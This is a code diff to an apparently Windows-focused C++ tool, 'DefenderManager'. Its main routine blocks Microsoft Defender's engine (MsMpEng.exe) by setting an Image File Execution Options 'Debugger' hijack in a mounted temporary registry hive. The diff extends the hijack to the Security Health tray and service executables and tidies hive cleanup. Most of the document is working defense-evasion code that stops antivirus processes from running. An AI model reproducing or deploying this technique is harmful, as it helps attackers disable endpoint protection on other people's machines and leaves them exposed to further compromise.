@@ -71,6 +71,20 @@ bool DefenderManager::EnableSecurityEngine() noexcept
         std::wcout << L"[-] WinDefend could not be started (service may be absent or disabled)\n";
     }
 
+    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (hSCM) {
+        SC_HANDLE hHealth = OpenServiceW(hSCM, L"SecurityHealthService", SERVICE_START);
+        if (hHealth) {
+            if (StartServiceW(hHealth, 0, nullptr) ||
+                GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
+                std::wcout << L"[+] SecurityHealthService started\n";
+            else
+                std::wcout << L"[-] SecurityHealthService could not be started\n";
+            CloseServiceHandle(hHealth);
+        }
+        CloseServiceHandle(hSCM);
+    }
+
     return true;
 }
 
@@ -161,7 +175,7 @@ bool DefenderManager::CreateIFEOSnapshot(HiveContext& ctx) noexcept
         return false;
     }
 
-    ctx.hiveFile = ctx.tempPath + L"Ifeo.hiv";
+    ctx.hiveFile = ctx.tempPath + L"\\Ifeo.hiv";
 
     // Remove stale hive file.
     if (fs::exists(ctx.hiveFile))
@@ -202,36 +216,48 @@ bool DefenderManager::CreateIFEOSnapshot(HiveContext& ctx) noexcept
 
 bool DefenderManager::ModifyMsMpEngIFEO(const HiveContext& /*ctx*/, bool addBlock) noexcept
 {
-    // Path inside the mounted temp hive: TempIFEO\MsMpEng.exe
-    const std::wstring keyPath = std::wstring(TEMP_HIVE_NAME) + L"\\MsMpEng.exe";
+    // MsMpEng.exe is required; SecurityHealthSystray.exe and SecurityHealthService.exe
+    // are companion blocks — their failure is non-fatal.
+    static constexpr const wchar_t* targets[] = {
+        L"MsMpEng.exe",
+        L"SecurityHealthSystray.exe",
+        L"SecurityHealthService.exe"
+    };
 
-    if (addBlock) {
-        HKEY hKey = nullptr;
-        LONG r = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
-                                 0, nullptr, REG_OPTION_NON_VOLATILE,
-                                 KEY_WRITE, nullptr, &hKey, nullptr);
-        if (r != ERROR_SUCCESS) {
-            std::wcout << L"[!] RegCreateKeyEx on TempIFEO\\MsMpEng.exe failed: " << r << L"\n";
-            return false;
-        }
-        const DWORD sz = static_cast<DWORD>((wcslen(DEBUGGER_PAYLOAD) + 1) * sizeof(wchar_t));
-        r = RegSetValueExW(hKey, DEBUGGER_VALUE, 0, REG_SZ,
-                           reinterpret_cast<const BYTE*>(DEBUGGER_PAYLOAD), sz);
-        RegCloseKey(hKey);
-        if (r != ERROR_SUCCESS) {
-            std::wcout << L"[!] RegSetValueEx Debugger failed: " << r << L"\n";
-            return false;
-        }
-    } else {
-        // Remove Debugger value first; then try to delete the key (leaf only).
-        HKEY hKey = nullptr;
-        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
-                          0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-            RegDeleteValueW(hKey, DEBUGGER_VALUE);
+    for (size_t i = 0; i < 3; ++i) {
+        const std::wstring keyPath = std::wstring(TEMP_HIVE_NAME) + L"\\" + targets[i];
+        const bool required = (i == 0);
+
+        if (addBlock) {
+            HKEY hKey = nullptr;
+            LONG r = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
+                                     0, nullptr, REG_OPTION_NON_VOLATILE,
+                                     KEY_WRITE, nullptr, &hKey, nullptr);
+            if (r != ERROR_SUCCESS) {
+                if (required) {
+                    std::wcout << L"[!] RegCreateKeyEx on TempIFEO\\" << targets[i]
+                               << L" failed: " << r << L"\n";
+                    return false;
+                }
+                continue;
+            }
+            const DWORD sz = static_cast<DWORD>((wcslen(DEBUGGER_PAYLOAD) + 1) * sizeof(wchar_t));
+            r = RegSetValueExW(hKey, DEBUGGER_VALUE, 0, REG_SZ,
+                               reinterpret_cast<const BYTE*>(DEBUGGER_PAYLOAD), sz);
             RegCloseKey(hKey);
+            if (r != ERROR_SUCCESS && required) {
+                std::wcout << L"[!] RegSetValueEx Debugger failed: " << r << L"\n";
+                return false;
+            }
+        } else {
+            HKEY hKey = nullptr;
+            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
+                              0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+                RegDeleteValueW(hKey, DEBUGGER_VALUE);
+                RegCloseKey(hKey);
+            }
+            RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
         }
-        // Best-effort key deletion (fails silently if the key has other values).
-        RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
     }
 
     return true;
@@ -337,11 +363,19 @@ void DefenderManager::HiveContext::Cleanup() noexcept
         DeleteFileW(path.c_str());
     }
 
-    // Remove any .regtrans-ms transaction files in the same directory.
+    // Remove CLFS transaction files created by RegLoadKey/RegUnLoadKey.
+    // They live in the same directory as the hive file and are named
+    // <hivefilename>{GUID}.TM.blf and <hivefilename>{GUID}.TMContainer*.regtrans-ms.
     try {
-        for (const auto& entry : fs::directory_iterator(tempPath)) {
-            if (entry.path().extension() == L".regtrans-ms")
+        const fs::path hiveDir  = fs::path(hiveFile).parent_path();
+        const std::wstring base = fs::path(hiveFile).filename().wstring();
+        for (const auto& entry : fs::directory_iterator(hiveDir)) {
+            const std::wstring fname = entry.path().filename().wstring();
+            if (fname.size() > base.size() &&
+                _wcsnicmp(fname.c_str(), base.c_str(), base.size()) == 0 &&
+                fname[base.size()] == L'{') {
                 DeleteFileW(entry.path().c_str());
+            }
         }
     } catch (...) {}
 }
